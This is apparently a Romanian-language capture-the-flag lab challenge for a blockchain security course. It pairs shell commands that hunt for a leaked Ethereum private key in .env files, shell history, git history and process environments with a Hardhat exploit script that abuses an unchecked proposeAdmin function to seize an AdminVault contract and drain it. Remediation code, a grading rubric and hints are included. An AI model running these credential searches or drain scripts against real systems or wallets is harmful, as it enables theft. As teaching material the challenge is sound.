# 🔑 Challenge 3: Access Control & Private Key Security

**Dificultate**: 🔴 Advanced  
**Puncte**: 40  
**Durată estimată**: 60-90 minute

## 📖 Povestea

Investigația internă la EtherBank continuă. După atacurile anterioare, echipa de securitate a descoperit că administratorul principal, **Alex "SloppyOps" Johnson**, are practici **extrem de nesigure** de gestionare a cheilor criptografice.

Informatorii interni raportează:
- 🚨 Alex și-a salvat cheia privată într-un fișier "secret" pe serverul de development
- 🚨 A copiat cheia în mai multe locații "pentru backup"
- 🚨 Contractul **AdminVault** (care gestionează fondul de rezervă al băncii) are probleme de Access Control

Mai grav, contractul permite oricui să devină administrator printr-un bug de logică.

**Misiunea ta**: În calitate de Red Team Operator, trebuie să:
1. Găsești cheia privată ascunsă în VM
2. Identifici și exploatezi vulnerabilitatea de Access Control
3. Preiei controlul contractului AdminVault
4. Demonstrezi impact-ul recuperând fondurile

> Notă: cheia privată și artefactele de leak sunt generate per student la deploy (`npm run deploy:admin`).

---

## 🎯 Obiective

### Obiectiv 1: Private Key Discovery (15 puncte)

Scanează VM-ul și găsește cheia privată ascunsă:

1. **Locații comune de căutat**:
   - Fișiere de configurare (`.env`, `config.json`)
   - Bash history (`.bash_history`, `.zsh_history`)
   - Environment variables
   - Git commits (⚠️ FOARTE COMUN în practică!)
   - Hidden files în home directory
   - Backup files (`.bak`, `.old`, `~`)

2. **Importă cheia în MetaMask sau script**
3. **Verifică balanța asociată**

### Obiectiv 2: Access Control Exploitation (25 puncte)

Analizează contractul `AdminVault.sol` și:

1. **Identifică bug-ul de Access Control** (10p)
2. **Scrie un exploit** pentru a deveni admin (10p)
3. **Preiei controlul** și extragi fondurile (5p)

---

## 🧠 Concepte Teoretice

### Private Key Security

#### Ce este o Cheie Privată?

```
Private Key (256-bit):
0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef

→ Generează →

Public Key (Ethereum address):
0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb5
```

**IMPORTANT**: Oricine are cheia privată **deține complet** adresa și fondurile asociate. Nu există "recuperare parolă"!

#### Greșeli Comune de Securitate

❌ **NU face niciodată**:
```bash
# 1. Commit în Git
git add .env
git commit -m "Add config"  # 🚨 Cheia e acum în history PERMANENT

# 2. Hardcode în cod
const privateKey = "0x1234...";  # 🚨 Vizibil în repo public

# 3. Salvare în plaintext
echo "MY_KEY=0x1234..." > keys.txt  # 🚨 Fără criptare

# 4. Environment variables în producție
export PRIVATE_KEY="0x1234..."  # 🚨 Vizibil în procese

# 5. Share în chat/email
"Hey, here's the key: 0x1234..."  # 🚨 Interceptabil
```

✅ **Best Practices**:
```bash
# 1. Hardware Wallets (Ledger, Trezor)
# Cheia NU părăsește niciodată device-ul

# 2. Key Management Systems (KMS)
# AWS KMS, HashiCorp Vault, Azure Key Vault

# 3. Multi-sig Wallets
# Necesită multiple semnături pentru tranzacții

# 4. Environment variables (doar în development)
# + .gitignore pentru .env files

# 5. Encrypted keystores
# Geth keystore format cu parolă puternică
```

### Access Control în Smart Contracts

#### Tipuri de Access Control

**1. Owner-based (Simplul, dar funcțional)**
```solidity
contract SimpleOwnable {
    address public owner;
    
    constructor() {
        owner = msg.sender;
    }
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }
    
    function criticalFunction() public onlyOwner {
        // Doar owner-ul poate apela
    }
}
```

**2. Role-based Access Control (RBAC)**
```solidity
contract RBAC {
    mapping(address => bool) public admins;
    mapping(address => bool) public moderators;
    
    modifier onlyAdmin() {
        require(admins[msg.sender], "Not admin");
        _;
    }
    
    modifier onlyModerator() {
        require(moderators[msg.sender], "Not moderator");
        _;
    }
}
```

**3. OpenZeppelin AccessControl (Professional)**
```solidity
import "@openzeppelin/contracts/access/AccessControl.sol";

contract MyContract is AccessControl {
    bytes32 public constant ADMIN_ROLE = keccak256("ADMIN_ROLE");
    bytes32 public constant MINTER_ROLE = keccak256("MINTER_ROLE");
    
    constructor() {
        _grantRole(DEFAULT_ADMIN_ROLE, msg.sender);
    }
    
    function mint() public onlyRole(MINTER_ROLE) {
        // Doar minter-ii pot apela
    }
}
```

#### Vulnerabilități Comune

**1. Missing Access Control**
```solidity
// ❌ VULNERABIL
function setAdmin(address newAdmin) public {
    admin = newAdmin;  // Oricine poate deveni admin!
}
```

**2. Incorrect Modifier**
```solidity
// ❌ VULNERABIL
modifier onlyAdmin() {
    require(admin != address(0));  // Nu verifică caller-ul!
    _;
}
```

**3. Front-running Admin Changes**
```solidity
// ❌ VULNERABIL
function changeAdmin(address newAdmin) public onlyAdmin {
    admin = newAdmin;  // Imediat activ, fără timelock
}
```

---

## 📝 Pași de Urmat

### Partea 1: Private Key Discovery

#### Pas 1: Enumerarea Locațiilor Posibile

Creează un checklist:

```bash
# 1. Fișiere evidente
cat ~/.env
cat ~/lab4-blockchain-defi/.env
cat ~/lab4-blockchain-defi/.env.local
find ~ -name "*.env" -o -name "*config*" -o -name "*secret*"

# 2. Bash history
cat ~/.bash_history | grep -i "private\|key\|secret\|export"
cat ~/.zsh_history | grep -i "private\|key\|secret"

# 3. Environment variables
env | grep -i "key\|private\|secret"
printenv

# 4. Hidden files în home
ls -la ~ | grep "^\."
cat ~/.secret
cat ~/.keys

# 5. Git history (FOARTE IMPORTANT!)
cd ~/lab4-blockchain-defi
git log --all --full-history --pretty=format:"%H" | while read commit; do
    git show $commit | grep -i "private"
done

# Sau folosește tool specializat:
git log -p | grep -i "private\|0x[a-f0-9]\{64\}"

# 6. Backup files
find ~ -name "*.bak" -o -name "*.old" -o -name "*~"

# 7. Process environment (dacă există procese running)
ps aux | grep node
cat /proc/[PID]/environ | tr '\0' '\n'
```

#### Pas 2: Scanare Automată

Folosește script-ul helper:

```bash
cd ~/lab4-blockchain-defi/scripts
./find-private-key.sh
```

Script-ul va scana:
- Toate .env files
- Git history
- Bash history
- Common locations

Output:
```
🔍 Scanning for private keys...

[+] Found in ~/.bash_history (line 42):
    export ADMIN_KEY=0x1234567890abcdef...

[+] Found in git commit a3f5b9c:
    File: old-config.js
    - const privateKey = "0x1234567890..."

[!] Total findings: 2
```

#### Pas 3: Validarea Cheii

După ce găsești cheia, validează-o:

```javascript
// validate-key.js
const ethers = require('ethers');

const privateKey = "0x1234567890abcdef...";  // Cheia găsită

try {
    const wallet = new ethers.Wallet(privateKey);
    console.log("✅ Cheia este validă!");
    console.log(`Address: ${wallet.address}`);
    
    // Conectează-te la provider și verifică balanța
    const provider = new ethers.providers.JsonRpcProvider("http://localhost:7545");
    const walletConnected = wallet.connect(provider);
    
    const balance = await walletConnected.getBalance();
    console.log(`Balance: ${ethers.utils.formatEther(balance)} ETH`);
    
} catch (error) {
    console.log("❌ Cheia este invalidă!");
}
```

Rulează:
```bash
node validate-key.js
```

#### Pas 4: Import în MetaMask

1. Deschide MetaMask
2. Click pe icon-ul de cont (sus-dreapta)
3. "Import Account"
4. Selectează "Private Key"
5. Paste cheia găsită
6. Click "Import"

Ar trebui să vezi contul cu balanță!

---

### Partea 2: Access Control Exploitation

#### Pas 1: Analiza Contractului

Deschide `contracts/AdminVault.sol`:

```bash
code ~/lab4-blockchain-defi/contracts/AdminVault.sol
```

**Caută funcțiile critice**:
- `proposeAdmin()` - Cine poate apela?
- `acceptAdmin()` - Ce verificări există?
- `emergencyWithdraw()` - Ce poate face admin-ul?

**Întrebări de analiză**:
1. Ce verificări lipsesc în `proposeAdmin()`?
2. Poate oricine să devină `pendingAdmin`?
3. Odată `pendingAdmin`, ce poți face?

#### Pas 2: Identificarea Bug-ului

Compară cu pattern-ul securizat:

```solidity
// ❌ VULNERABIL (în AdminVault)
function proposeAdmin(address _newAdmin) public {
    pendingAdmin = _newAdmin;  // Lipsește: require(msg.sender == admin)
}

// ✅ SECURIZAT
function proposeAdmin(address _newAdmin) public onlyAdmin {
    pendingAdmin = _newAdmin;
}
```

#### Pas 3: Proof of Concept

Scrie un test pentru a verifica vulnerabilitatea:

```javascript
// test/test-admin-vulnerability.js
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("AdminVault Access Control Bug", function () {
  let adminVault;
  let owner, attacker;

  beforeEach(async function () {
    [owner, attacker] = await ethers.getSigners();
    
    const AdminVault = await ethers.getContractFactory("AdminVault");
    adminVault = await AdminVault.deploy();
    await adminVault.deployed();
    
    // Fund vault
    await adminVault.deposit({ value: ethers.utils.parseEther("100") });
  });

  it("Should allow anyone to become admin (BUG)", async function () {
    console.log("Current admin:", await adminVault.admin());
    console.log("Attacker address:", attacker.address);
    
    // Atacatorul se propune ca admin (ar trebui să eșueze, dar...)
    await adminVault.connect(attacker).proposeAdmin(attacker.address);
    console.log("✅ Attacker proposed as admin");
    
    // Atacatorul acceptă rolul
    await adminVault.connect(attacker).acceptAdmin();
    console.log("✅ Attacker accepted admin role");
    
    // Verificăm
    const newAdmin = await adminVault.admin();
    expect(newAdmin).to.equal(attacker.address);
    console.log("🚨 Attacker is now admin!");
  });

  it("Should allow attacker to drain funds", async function () {
    // Devenim admin (folosind bug-ul)
    await adminVault.connect(attacker).proposeAdmin(attacker.address);
    await adminVault.connect(attacker).acceptAdmin();
    
    // Extragem fondurile
    const balanceBefore = await ethers.provider.getBalance(attacker.address);
    
    await adminVault.connect(attacker).emergencyWithdraw();
    
    const balanceAfter = await ethers.provider.getBalance(attacker.address);
    const stolen = balanceAfter.sub(balanceBefore);
    
    console.log(`💰 Stolen: ${ethers.utils.formatEther(stolen)} ETH`);
    expect(stolen).to.be.gt(ethers.utils.parseEther("99")); // ~100 minus gas
  });
});
```

Rulează testul:
```bash
npx hardhat test test/test-admin-vulnerability.js
```

Output:
```
AdminVault Access Control Bug
Current admin: 0x742d35Cc...
Attacker address: 0xABC123...
✅ Attacker proposed as admin
✅ Attacker accepted admin role
🚨 Attacker is now admin!
    ✓ Should allow anyone to become admin (BUG)

💰 Stolen: 99.98 ETH
    ✓ Should allow attacker to drain funds

2 passing (1s)
```

#### Pas 4: Exploit Live

Deploy contractul vulnerabil:
```bash
npx hardhat run scripts/deploy-admin-vault.js --network localhost
```

Execută exploit-ul:

```javascript
// scripts/exploit-admin-vault.js
const hre = require("hardhat");

async function main() {
  const vaultAddress = "0x..."; // Din deploy
  const [attacker] = await hre.ethers.getSigners();
  
  console.log("🎯 Exploiting AdminVault...");
  console.log("Attacker:", attacker.address);
  
  const vault = await hre.ethers.getContractAt("AdminVault", vaultAddress);
  
  // Verificăm admin-ul curent
  const currentAdmin = await vault.admin();
  console.log(`Current admin: ${currentAdmin}`);
  
  // Pas 1: Ne propunem ca admin (exploatăm bug-ul)
  console.log("\n🔓 Step 1: Proposing attacker as admin...");
  const proposeTx = await vault.connect(attacker).proposeAdmin(attacker.address);
  await proposeTx.wait();
  console.log("✅ Proposed");
  
  // Pas 2: Acceptăm rolul
  console.log("\n✅ Step 2: Accepting admin role...");
  const acceptTx = await vault.connect(attacker).acceptAdmin();
  await acceptTx.wait();
  console.log("✅ Accepted");
  
  // Verificăm că suntem admin
  const newAdmin = await vault.admin();
  console.log(`\nNew admin: ${newAdmin}`);
  
  if (newAdmin === attacker.address) {
    console.log("🎉 Successfully became admin!");
    
    // Pas 3: Drenăm fondurile
    console.log("\n💰 Step 3: Draining funds...");
    const vaultBalance = await hre.ethers.provider.getBalance(vaultAddress);
    console.log(`Vault balance: ${hre.ethers.utils.formatEther(vaultBalance)} ETH`);
    
    const attackerBalanceBefore = await hre.ethers.provider.getBalance(attacker.address);
    
    const withdrawTx = await vault.connect(attacker).emergencyWithdraw();
    const receipt = await withdrawTx.wait();
    
    const attackerBalanceAfter = await hre.ethers.provider.getBalance(attacker.address);
    const profit = attackerBalanceAfter.sub(attackerBalanceBefore);
    
    console.log(`✅ Extracted ${hre.ethers.utils.formatEther(vaultBalance)} ETH`);
    console.log(`💸 Net profit: ${hre.ethers.utils.formatEther(profit)} ETH (minus gas)`);
    console.log(`Gas used: ${receipt.gasUsed.toString()}`);
  } else {
    console.log("❌ Failed to become admin");
  }
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
```

Rulează:
```bash
npx hardhat run scripts/exploit-admin-vault.js --network localhost
```

---

## ✅ Criteriu de Notare

| Task | Puncte | Cerințe |
|------|--------|---------|
| **Găsire private key** | 15p | Identifici locația și extragi cheia corect |
| **Validare cheie** | 3p | Importi în wallet și verifici balanța |
| **Identificare bug Access Control** | 10p | Explici corect vulnerabilitatea |
| **Exploit funcțional** | 10p | Reușești să devii admin |
| **Extragere fonduri** | 7p | Drenezi vault-ul cu succes |
| **BONUS: Remediere** | +5p | Propui cod securizat |
| **TOTAL** | **45p** | (40p + 5p bonus) |

---

## 📤 Livrabile

### 1. Raport de Investigație

Fișier: `challenge3-investigation.md`

```markdown
# Challenge 3: Access Control & Private Key Security

**Student**: [Nume]
**Data**: [Data]

## Partea 1: Private Key Discovery

### Metodologia de Căutare

**Locații verificate**:
- [ ] .env files
- [ ] Bash history
- [ ] Git commits
- [ ] Environment variables
- [ ] Backup files
- [ ] Hidden files

### Descoperirea Cheii

**Locația găsită**: [Unde ai găsit cheia]

**Comanda folosită**:
\`\`\`bash
[Comanda exactă care a găsit cheia]
\`\`\`

**Cheia privată**: `0x...` [primele și ultimele 8 caractere pentru siguranță]

**Adresa asociată**: `0x...`

**Balanța**: X ETH

### Lecții Învățate

[Explicație: De ce este periculos să salvezi chei în aceste locații?]

## Partea 2: Access Control Exploitation

### Analiza Vulnerabilității

**Funcția vulnerabilă**: `proposeAdmin()` (linia X)

**Bug-ul**:
\`\`\`solidity
[Code snippet cu problema]
\`\`\`

**De ce este vulnerabil**:
[Explicație detaliată]

**Impact**:
- Oricine poate deveni admin
- Admin-ul are acces la emergencyWithdraw()
- Pot fi furate toate fondurile

### Exploatarea

**Addresses**:
- AdminVault: `0x...`
- Attacker: `0x...`

**Pași**:
1. Apelare `proposeAdmin(attacker.address)` de către oricine
2. Apelare `acceptAdmin()` de către attacker
3. Apelare `emergencyWithdraw()` ca admin
4. Profit!

**Rezultate**:
- Fonduri în vault înainte: X ETH
- Fonduri extrase: Y ETH
- Gas consumat: Z ETH
- Profit net: (Y - Z) ETH

### Screenshots

[Include output-ul scriptului de exploit]

## Partea 3: Remediere

### Varianta 1: Modifier Corect

\`\`\`solidity
[Codul securizat]
\`\`\`

### Varianta 2: Timelock

\`\`\`solidity
[Implementare cu timelock pentru schimbarea admin-ului]
\`\`\`

### Varianta 3: Multi-sig

[Explicație despre cum un multi-sig wallet ar preveni atacul]

## Concluzii

### Top 3 Lecții

1. [Lecție despre private keys]
2. [Lecție despre access control]
3. [Lecție despre defense in depth]

### Aplicabilitate în Lumea Reală

[Exemple de vulnerabilități similare în proiecte reale]
```

---

## 💡 Hints

<details>
<summary>🔍 Hint 1: Nu găsesc cheia privată</summary>

Încearcă să cauți în Git history:

```bash
cd ~/lab4-blockchain-defi
git log --all --oneline
git show <commit-hash> | grep -i "private\|0x"
```

Sau folosește `git-secrets` tool:
```bash
git log -p | grep -E "0x[a-f0-9]{64}"
```

Cheia are formatul: `0x` urmat de 64 caractere hexadecimale.
</details>

<details>
<summary>🔍 Hint 2: Cheia nu funcționează în MetaMask</summary>

Verifică:
1. Ai copiat întreaga cheie (66 caractere: `0x` + 64 hex)
2. Nu ai spații sau newlines în cheie
3. Nu confunzi private key cu address

Test rapid în Node.js:
```javascript
const ethers = require('ethers');
const wallet = new ethers.Wallet("0x...");
console.log(wallet.address);
```
</details>

<details>
<summary>🔍 Hint 3: Nu înțeleg de ce proposeAdmin() e vulnerabil</summary>

Compară aceste 2 versiuni:

```solidity
// VULNERABIL
function proposeAdmin(address _newAdmin) public {
    pendingAdmin = _newAdmin;
    // ❌ Oricine poate apela asta!
}

// SECURIZAT
function proposeAdmin(address _newAdmin) public {
    require(msg.sender == admin, "Only admin");
    pendingAdmin = _newAdmin;
    // ✅ Doar admin-ul actual poate propune un admin nou
}
```

Fără verificare, ORICINE (inclusiv tu, atacatorul) poate seta `pendingAdmin = attacker.address`.
</details>

<details>
<summary>🔍 Hint 4: Cum testez exploitul fără să deploy?</summary>

Folosește Hardhat tests:

```bash
npx hardhat test test/test-admin-vulnerability.js
```

Testele rulează pe o rețea locală temporară, instantanee și fără costuri.
</details>

---

## 🎓 Resurse Suplimentare

### Private Key Leaks - Cazuri Reale

**1. Parity Wallet Hack (2017)**
- Bug în library contract → $150M blocați
- Multi-sig wallet compromis
- [Post-mortem](https://www.parity.io/blog/a-postmortem-on-the-parity-multi-sig-library-self-destruct/)

**2. GitHub Key Leaks**
- Mii de private keys committed în repos publice
- Bots scanează 24/7 pentru keys leaked
- Fondurile sunt furate în secunde

**Tool pentru verificare**: [GitGuardian](https://www.gitguardian.com/)

**3. Poly Network Hack (2021)**
- $600M furat prin vulnerabilitate de access control
- Hacker-ul a returnat fondurile (White Hat?)
- [Analysis](https://rekt.news/polynetwork-rekt/)

### Access Control Frameworks

**OpenZeppelin AccessControl**:
```bash
npm install @openzeppelin/contracts
```

```solidity
import "@openzeppelin/contracts/access/AccessControl.sol";

contract MyVault is AccessControl {
    bytes32 public constant ADMIN_ROLE = keccak256("ADMIN_ROLE");
    
    constructor() {
        _grantRole(DEFAULT_ADMIN_ROLE, msg.sender);
        _grantRole(ADMIN_ROLE, msg.sender);
    }
    
    function emergencyWithdraw() public onlyRole(ADMIN_ROLE) {
        // Only admins
    }
}
```

### Security Tools

**Static Analysis**:
- [Slither](https://github.com/crytic/slither) - Detects vulnerabilities
- [Mythril](https://github.com/ConsenSys/mythril) - Security analysis
- [Manticore](https://github.com/trailofbits/manticore) - Symbolic execution

**Git Secrets Scanning**:
```bash
# Install git-secrets
brew install git-secrets

# Setup hooks
git secrets --install
git secrets --register-aws

# Scan history
git secrets --scan-history
```

---

**Succes la investigație, Agent! 🕵️‍♂️**

*"The best place to hide a key is not in plain sight. But developers do it anyway."*
